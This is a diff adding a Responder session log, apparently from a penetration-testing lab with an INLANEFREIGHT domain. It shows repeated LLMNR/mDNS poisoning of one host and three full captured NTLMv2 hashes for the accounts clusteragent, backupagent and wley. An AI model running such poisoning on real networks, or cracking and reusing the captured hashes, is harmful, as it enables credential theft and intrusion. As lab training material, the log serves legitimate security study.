@@ -1,0 +1,501 @@
+└──╼ $tail -500 Responder-Session.log 
+04/08/2026 04:08:44 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:08:44 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:08:45 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:08:45 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:08:45 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:08:45 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:08:45 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:08:46 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:08:46 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:08:46 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:08:46 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:08:46 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:08:46 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:08:46 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:08:46 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:08:46 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:08:46 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:08:46 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:08:46 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:08:46 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:08:46 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:08:47 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:08:47 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:08:47 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:08:47 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:08:47 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:08:47 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:08:47 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:08:47 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:08:47 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:08:47 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:08:47 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:08:47 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:08:48 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:08:48 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:08:49 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:08:49 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:08:51 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:08:51 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:08:51 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:08:51 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:08:52 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:08:52 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:08:52 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:08:52 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:08:52 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:08:52 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:08:52 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:08:52 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:08:53 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:08:53 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:08:53 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:08:53 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:08:53 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:08:53 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:08:53 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:08:53 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:08:54 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:08:54 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:08:54 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:08:54 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:08:54 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:08:54 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:08:54 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:08:54 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:08:55 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:08:55 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:08:55 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:08:55 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:08:55 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:08:55 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:08:56 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:08:56 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:08:56 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:08:56 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:08:56 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:08:56 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:08:57 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:08:57 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:08:59 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:08:59 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:00 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:00 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:01 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:09:01 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:09:02 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:02 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:02 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:02 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:02 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:02 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:03 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:03 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:03 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:03 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:04 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:09:04 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:09:04 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:04 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:04 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:09:04 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:09:05 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:05 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:05 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:05 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:06 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:06 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:06 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:06 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:06 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:09:06 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:09:07 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:09:07 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:09:10 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:10 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:10 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:10 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:11 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:11 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:11 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:09:11 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:09:15 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:15 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:15 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:15 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:16 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:16 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:16 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:16 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:16 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:09:16 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:09:17 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:17 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:17 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:09:17 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:09:19 PM - [SMB] NTLMv2-SSP Client   : 172.16.5.130
+04/08/2026 04:09:19 PM - [SMB] NTLMv2-SSP Username : INLANEFREIGHT\clusteragent
+04/08/2026 04:09:19 PM - [SMB] NTLMv2-SSP Hash     : clusteragent::INLANEFREIGHT:20396afcc96d4b0a:4C715AACA42B6427168FD1858BA96021:0101000000000000807C3CF071C7DC012179AA010AA63D1800000000020008004B0038003700530001001E00570049004E002D0052003000490057005900330042004A0031003700340004003400570049004E002D0052003000490057005900330042004A003100370034002E004B003800370053002E004C004F00430041004C00030014004B003800370053002E004C004F00430041004C00050014004B003800370053002E004C004F00430041004C0007000800807C3CF071C7DC01060004000200000008003000300000000000000000000000003000005731BC921595FE4A64EC590CF510B5CD77432252F256EEEE074407B565ACD6A10A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
+04/08/2026 04:09:19 PM - [*] Skipping previously captured hash for INLANEFREIGHT\clusteragent
+04/08/2026 04:09:19 PM - [*] Skipping previously captured hash for INLANEFREIGHT\clusteragent
+04/08/2026 04:09:19 PM - [*] Skipping previously captured hash for INLANEFREIGHT\clusteragent
+04/08/2026 04:09:19 PM - [*] Skipping previously captured hash for INLANEFREIGHT\clusteragent
+04/08/2026 04:09:19 PM - [*] Skipping previously captured hash for INLANEFREIGHT\clusteragent
+04/08/2026 04:09:19 PM - [*] Skipping previously captured hash for INLANEFREIGHT\clusteragent
+04/08/2026 04:09:19 PM - [*] Skipping previously captured hash for INLANEFREIGHT\clusteragent
+04/08/2026 04:09:19 PM - [*] Skipping previously captured hash for INLANEFREIGHT\clusteragent
+04/08/2026 04:09:19 PM - [*] Skipping previously captured hash for INLANEFREIGHT\clusteragent
+04/08/2026 04:09:19 PM - [*] Skipping previously captured hash for INLANEFREIGHT\clusteragent
+04/08/2026 04:09:19 PM - [*] Skipping previously captured hash for INLANEFREIGHT\clusteragent
+04/08/2026 04:09:19 PM - [*] Skipping previously captured hash for INLANEFREIGHT\clusteragent
+04/08/2026 04:09:21 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:21 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:22 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:22 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:22 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:22 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:22 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:09:22 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:09:24 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:24 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:25 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:25 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:26 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:09:26 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:09:27 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:27 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:28 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:28 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:29 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:09:29 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:09:31 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:31 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:32 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:32 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:33 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:09:33 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:09:36 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:36 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:36 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:36 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:37 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:09:37 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:09:37 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:37 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:38 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:38 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:39 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:39 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:39 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:09:39 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:09:40 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:40 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:09:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:09:41 PM - [SMB] NTLMv2-SSP Client   : 172.16.5.130
+04/08/2026 04:09:41 PM - [SMB] NTLMv2-SSP Username : INLANEFREIGHT\backupagent
+04/08/2026 04:09:41 PM - [SMB] NTLMv2-SSP Hash     : backupagent::INLANEFREIGHT:732d40debf7aecbf:052B74B10BBFC5E5CD7A173F17A898B8:0101000000000000807C3CF071C7DC01A32169065755B10E00000000020008004B0038003700530001001E00570049004E002D0052003000490057005900330042004A0031003700340004003400570049004E002D0052003000490057005900330042004A003100370034002E004B003800370053002E004C004F00430041004C00030014004B003800370053002E004C004F00430041004C00050014004B003800370053002E004C004F00430041004C0007000800807C3CF071C7DC01060004000200000008003000300000000000000000000000003000005731BC921595FE4A64EC590CF510B5CD77432252F256EEEE074407B565ACD6A10A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
+04/08/2026 04:09:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\backupagent
+04/08/2026 04:09:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\backupagent
+04/08/2026 04:09:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\backupagent
+04/08/2026 04:09:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\backupagent
+04/08/2026 04:09:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\backupagent
+04/08/2026 04:09:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\backupagent
+04/08/2026 04:09:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\backupagent
+04/08/2026 04:09:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\backupagent
+04/08/2026 04:09:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\backupagent
+04/08/2026 04:09:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\backupagent
+04/08/2026 04:09:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\backupagent
+04/08/2026 04:09:41 PM - [*] Skipping previously captured hash for INLANEFREIGHT\backupagent
+04/08/2026 04:09:47 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:47 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:47 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:47 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:48 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:09:48 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:09:56 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:56 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:57 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:09:57 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:09:58 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:09:58 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:10:00 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:10:00 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:10:01 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:10:01 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:10:02 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:10:02 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:10:03 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:10:03 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:10:04 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:10:04 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:10:04 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:10:04 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:10:05 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:10:05 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:10:05 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:10:06 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:10:06 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:10:06 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:10:07 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:10:07 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:10:08 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:10:08 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:10:08 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:10:08 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:10:09 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:10:09 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:10:10 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:10:10 PM - [*] Skipping previously captured hash for INLANEFREIGHT\lab_adm
+04/08/2026 04:10:10 PM - [*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+04/08/2026 04:10:10 PM - [*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+04/08/2026 04:10:10 PM - [SMB] NTLMv2-SSP Client   : 172.16.5.130
+04/08/2026 04:10:10 PM - [SMB] NTLMv2-SSP Username : INLANEFREIGHT\wley
+04/08/2026 04:10:10 PM - [SMB] NTLMv2-SSP Hash     : wley::INLANEFREIGHT:42e531d7e553ec83:0FD978C98C5C5A2B56E9003B35DA1485:0101000000000000807C3CF071C7DC017E4E9FC3BD492EA300000000020008004B0038003700530001001E00570049004E002D0052003000490057005900330042004A0031003700340004003400570049004E002D0052003000490057005900330042004A003100370034002E004B003800370053002E004C004F00430041004C00030014004B003800370053002E004C004F00430041004C00050014004B003800370053002E004C004F00430041004C0007000800807C3CF071C7DC01060004000200000008003000300000000000000000000000003000005731BC921595FE4A64EC590CF510B5CD77432252F256EEEE074407B565ACD6A10A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
+04/08/2026 04:10:10 PM - [*] Skipping previously captured hash for INLANEFREIGHT\wley
+04/08/2026 04:10:10 PM - [*] Skipping previously captured hash for INLANEFREIGHT\wley
+04/08/2026 04:10:10 PM - [*] Skipping previously captured hash for INLANEFREIGHT\wley
+04/08/2026 04:10:10 PM - [*] Skipping previously captured hash for INLANEFREIGHT\wley
+04/08/2026 04:10:10 PM - [*] Skipping previously captured hash for INLANEFREIGHT\wley
+04/08/2026 04:10:10 PM - [*] Skipping previously captured hash for INLANEFREIGHT\wley
+04/08/2026 04:10:10 PM - [*] Skipping previously captured hash for INLANEFREIGHT\wley
+04/08/2026 04:10:10 PM - [*] Skipping previously captured hash for INLANEFREIGHT\wley
